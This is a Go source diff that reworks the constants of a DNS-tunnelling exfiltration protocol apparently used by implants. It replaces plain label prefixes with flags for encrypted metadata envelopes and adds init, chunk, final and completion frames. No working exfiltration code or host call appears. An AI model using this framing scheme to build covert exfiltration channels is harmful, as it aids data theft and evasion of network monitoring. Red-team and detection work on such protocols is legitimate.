@@ -34,14 +34,32 @@ const (
 	// ExfilSessionTagPrefix enforces the E## tag style used by exfil implants
 	ExfilSessionTagPrefix = "E"
 
-	// ExfilChunkCounterWidth is the fixed width for chunk counters encoded in DNS labels
-	ExfilChunkCounterWidth = 5
+	// ExfilMetadataPrefix marks metadata labels that encapsulate encrypted envelopes
+	ExfilMetadataPrefix = "EX"
 
-	// ExfilFramePrefix marks DNS labels that carry dedicated exfil traffic
-	ExfilFramePrefix = "EX-"
+	// ExfilPadLabel is used when a frame carries no payload label
+	ExfilPadLabel = "0"
 
-	// ExfilCompleteToken marks completion frames emitted by the exfil client
-	ExfilCompleteToken = "COMPLETE"
+	// FrameEnvelopeVersion is the schema version for encrypted metadata envelopes
+	FrameEnvelopeVersion = 1
+
+	// FrameEnvelopeTagLength is the number of bytes storing the session tag inside the envelope
+	FrameEnvelopeTagLength = 3
+
+	// FrameEnvelopeFlagInit marks initialization frames that announce total frames
+	FrameEnvelopeFlagInit = 0x01
+
+	// FrameEnvelopeFlagChunk marks chunk frames (metadata + data payloads)
+	FrameEnvelopeFlagChunk = 0x02
+
+	// FrameEnvelopeFlagComplete marks completion frames
+	FrameEnvelopeFlagComplete = 0x04
+
+	// FrameEnvelopeFlagMetadata marks the metadata chunk (chunk index 0)
+	FrameEnvelopeFlagMetadata = 0x08
+
+	// FrameEnvelopeFlagFinal marks the last data chunk within a transfer
+	FrameEnvelopeFlagFinal = 0x10
 
 	// DNSLabelMaxLength is the maximum length for a single DNS label
 	DNSLabelMaxLength = 62
